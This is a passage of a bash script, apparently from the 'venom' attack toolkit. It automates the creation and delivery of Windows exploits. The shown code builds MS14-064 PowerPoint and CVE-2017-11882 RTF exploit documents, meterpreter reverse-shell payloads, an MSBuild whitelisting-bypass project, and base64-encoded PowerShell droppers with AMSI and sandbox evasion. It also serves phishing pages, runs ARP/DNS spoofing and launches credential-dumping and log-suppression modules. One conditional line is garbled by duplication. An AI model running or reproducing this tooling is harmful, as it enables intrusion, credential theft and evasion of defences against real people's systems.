            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/astrobaby[bk].c $IPATH/templates/astrobaby.c > /dev/nul 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/$N4m.docm > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}




# ---------------------------------------------------------------------
# ms14_064_packager_python
# Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013
# ---------------------------------------------------------------------
sh_world24 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ms14_064" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ms14_064";fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PYTHON -> WINDOWS
    PAYLOAD : python/meterpreter/reverse_tcp
    AGENT   : $IPATH/output/$N4m.ppsx

!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] template -> found!"
      sleep 2
   else
      echo "[☠] template -> not found!"
      exit
   fi



# building template
echo "[☠] editing/backup files .."
sleep 2
if [ -e $H0m3/.msf4/local/$N4m.ppsx ]; then
rm $H0m3/.msf4/local/$N4m.ppsx > /dev/null 2>&1
fi


echo "[☠] Generating binary agent .."
sleep 2

# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/ms14_064_packager_python; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set FILENAME $N4m.ppsx; set LHOST $lhost; set LPORT $lport; run; exit -y'" > /dev/null 2>&1
mv $H0m3/.msf4/local/$N4m.ppsx $IPATH/output/$N4m.ppsx > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.ppsx .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ppsx\n\nchose how to deliver: $N4m.ppsx" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.ppsx|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ppsx $ApAcHe/$N4m.ppsx > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ppsx $ApAcHe/$N4m.ppsx
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}





# ---------------------------------------------------------------------
# CVE-2017-11882 (rtf word doc)
# ---------------------------------------------------------------------
sh_world25 () {
# get user input to build shellcode
echo "[☠] Enter exploit settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 370 --height 280) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ DOCUMENT NAME ☠" --text "Enter document output name\nexample: office" --width 300) > /dev/null 2>&1
sleep 1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$N4m" ]; then N4m="office";fi

# display final settings to user
cat << !

    exploit settings
    ────────────────
    LHOST   : $lhost
    CVE     : CVE-2017-11882
    FORMAT  : ANCII/HEX -> MICROSOFT OFFICE (RTF)
    PAYLOAD : $paylo
    AGENT   : $IPATH/output/$N4m.rtf

!
sleep 1
  #
  # check if all dependencies needed are installed
  #
  echo "[☠] Checking exploit installation .."
  sleep 1
  if [ -e $pHanTom/exploits/windows/fileformat/office_ms17_11882.rb ]; then
     echo "[✔] Exploit office_ms17_11882 -> found!"
     sleep 2
  else
     echo "[x] Exploit office_ms17_11882 -> not found!"
     sleep 2
     echo "[*] Please wait, installing required module .."
     sleep 2
     cp $IPATH/aux/msf/office_ms17_11882.rb $pHanTom/exploits/windows/fileformat/office_ms17_11882.rb
     echo "[*] Please wait, rebuilding msfdb .."
     sleep 1
     xterm -T " REBUILDING MSFBD " -geometry 145x26 -e "msfdb reinit" > /dev/null 2>&1
     echo "[*] Please wait, reloading all module paths .."
     sleep 1
     xterm -T " RELOADING ALL MODULE PATHS " -geometry 145x26 -e "msfconsole -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
     echo "[✔] Exploit office_ms17_11882.rb installed .."
     sleep 2
  fi



  #
  # build CVE-2017-11882 RTF agent ..
  #
  echo "[☠] Generating MS_office_word agent (rtf) .."
  sleep 2
  echo "[☠] Attack vector: http://$lhost:8080/doc"
  sleep 1
  cd $IPATH/output
  xterm -T " EXPLOIT CVE-2017-11882 (rtf) " -geometry 158x28 -e "msfconsole -x 'use exploit/windows/fileformat/office_ms17_11882; set LHOST $lhost; set PAYLOAD $paylo; set FILENAME $IPATH/output/$N4m.rtf; set URIPATH /doc; exploit'" > /dev/null 2>&1
  sleep 2



# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
# rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}







#
# Build csharp shellcode embbebed into one template.xml
# use MSBUILD.exe (appl_whitelisting_bypass) to run our template.xml
#
sh_shellcodecsharp () {
QuEs=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Msbuild (xml execution) by: @subTee ..\nThis agent requires MSBUILD.exe vuln binary\ninstalled in target system to exec agent.csproj\n\nRun MSbuild module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1
# chose agent final name
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1



echo "[☠] Loading msbuild appl_whitelisting_bypass"
sleep 1
# display final settings to user
echo "[☠] Building shellcode -> CSHARP format .."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : CSHARP -> WINDOWS(XML)
    PAYLOAD : $paylo
    VULN    : msbuild - Application_whitelisting_bypass
    DISCLOSURE : @subTee

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f csharp -o $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f csharp -o $IPATH/output/chars.raw"
fi



echo ""
#
# display generated code
#
cd $IPATH/output
echo "Unsigned char buf[]="
  cat chars.raw | egrep ',' | cut -d '}' -f1
echo "" && echo ""
sleep 2


#
# parsing shellcode data
#
echo "[☠] Parsing agent shellcode data .."
sleep 2
Embebed=`cat chars.raw | egrep ',' | cut -d '}' -f1 | tr -d '\n'`
store=`cat chars.raw | awk {'print $5'} | tr -d '\n'`



#
# embebbed shellcode into template.xml
#
echo "[☠] Inject shellcode into template.xml"
sleep 2
cd $IPATH/templates
cp template.xml template.bak > /dev/null 2>&1
sed -i "s/INSERT_SHELLCODE_HERE/$Embebed/g" template.xml
sed -i "s/ByT33/$store/g" template.xml
cp template.xml $IPATH/output/$N4m.csproj


#
# build installer.bat (exec template.xml)
#
echo "[☠] Build installer.bat (execute: $N4m.csproj)"
sleep 2
cp installer.bat installer.bak > /dev/null 2>&1
sed -i "s/RePlaC/$N4m/g" installer.bat
cp installer.bat $IPATH/output/installer.bat


#
# EXECUTE THE LISTENNER (HANDLER)
#
zenity --info --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.csproj\n$IPATH/output/installer.bat\n\nMsbuild (xml execution) by: @subTee ..\nThis agent requires MSBUILD.exe vuln binary\ninstalled in target system to exec $N4m.csproj\n\nREMARK: installer.bat and $N4m.csproj\nmust be in the same directory (remote)\n'installer.bat will execute $N4m.csproj'" --width 310 > /dev/null 2>&1

      #
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      #
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $IPATH/output/chars.raw > /dev/null 2>&1
mv $IPATH/templates/template.bak $IPATH/templates/template.xml > /dev/null 2>&1
mv $IPATH/templates/installer.bak $IPATH/templates/installer.bat > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# to use certutil.exe download/exec in hta trigger
# ----------------------------------------------------
sh_certutil () {

# chose to use venom to build the payload or input your own binary.exe
chose=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "This module takes advantage of powershell DownloadFile() to remote download/exec agent.\n\nThis module builds one agent.bat (psh-cmd) OR\nasks for the full path of the agent.exe to be used" --radiolist --column "Pick" --column "Option" TRUE "Build venom agent.bat" FALSE "The full path of your agent.exe" --width 350 --height 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
# input payload name
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: ReL1K" --width 300) > /dev/null 2>&1
# input payload (agent) remote upload directory
D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:chose allways rewritable directorys\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi
if [ -z "$D1r" ]; then D1r="%tmp%";fi

#
# check if remote path was inputed correctlly (only enviroment variables accepted)
#
chec=`echo "$D1r" | grep "%"`
# verify if '$chec' local var contains the '%' string (enviroment variable)
if [ -z "$chec" ]; then
  echo "[x] WARNING: remote directory not supported .."
  echo "[✔] Setting remote upload directory to:%tmp%"
  D1r="%tmp%"
  sleep 2
fi



echo "[☠] Loading powershell DownloadFile()"
sleep 1
if [ "$chose" = "Build venom agent.bat" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2

  if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    echo "[☠] meterpreter over SSL sellected .."
    sleep 1
  fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS(bat)
    PAYLOAD : $paylo
    AGENT   : $IPATH/output/$N4m.bat

!

#
# use metasploit to build shellcode
# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
#
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
fi
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠] Obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] Editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.bat
cd $IPATH/output/
echo "[☠] Parsing agent shellcode data .."
sleep 1
echo "[☠] Injecting shellcode into: $N4m.bat"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&cmd.exe /c powershell.exe -nop -exec bypass -w 1 -noni -enc $disp" > $N4m.bat
else
echo "[✔] String obfuscation technic sellected .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
